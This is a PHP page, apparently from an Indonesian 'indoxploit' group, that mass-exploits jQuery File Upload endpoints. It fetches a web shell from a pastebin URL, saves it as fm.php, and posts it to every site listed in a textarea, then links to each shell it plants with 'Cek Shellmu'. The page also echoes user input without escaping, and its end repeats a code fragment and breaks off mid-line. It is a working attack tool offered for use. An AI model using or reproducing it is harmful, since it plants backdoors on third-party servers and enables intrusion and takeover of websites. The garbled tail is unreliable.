<title>jQuery File Upload</title>
<link href="https://fonts.googleapis.com/css?family=Share+Tech+Mono" rel="stylesheet">
<style>
a {
	color:#000;
}
body {
background:#fff;
color:#000;
font-family: Share Tech Mono ;
}
textarea {
background:#fff;
color:#000;
margin:4px;
padding:5px;
border:1px solid #000;
font-family: Share Tech Mono ;
}
th {
	background:#000;
	color:#fff;
	margin:4px;
	padding:4px;
}
input[type=submit] {
background:#000;
color:#fff;
border:1px solid #000;
font-family: Share Tech Mono ;
}
</style>
<center>
<form method="post">
<textarea name="sites" cols="40" rows="8" style="width: 400px">
<?=$_REQUEST['sites'];?>
</textarea >
<br />
<input type="submit" style="margin-top: 5px; font-size: 18px" name="open" value="EXEC" />
</form>
</center>
<?php
// indoxploit
// ustadcage_48 && aprilic0de
$get = file_get_contents('http://pastebin.com/raw/ddwqvhYR');
$bwt = fopen('fm.php', 'w');
fwrite($bwt,$get);
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['open'];
if($go) {
echo '<div style="margin: auto; width: 50%; min-width: 400px">
<table width="500" cellpadding="5" cellspacing="5">
<thead style="text-align: left">
<tbody>
';
foreach($site as $sites) {
$uploadfile = "fm.php";
$ch = curl_init($sites);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('files[]'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$res = curl_exec($ch);
curl_close($ch);
if(preg_match("/url|deleteUrl|deleteType/", $res)) {
preg_match('/"url":"(.*?)"/', $res, $get);
$urls = $get[1];
$sites = parse_url($sites);
$sites = $sites['host'];
?>
<tr><td># </td><td><?=$sites;?></td><td><a href='<?=$urls;?>' target='_blank'>Cek Shellmu</a></td></tr>
<?php
} else {
$sites = parse_url($sites);
$sites = $sites['host'];
	echo "<tr><td># </td><td>$sites</td><td> Gabisa Upload !!</td><tr>";
}
}
}
?>
<tr>
</tbody></table>
<br><br>('fm.php', 'w');
fwrite($bwt,$get);
$site = explode("\r\n", $_POST['sites']);
$go = $_P
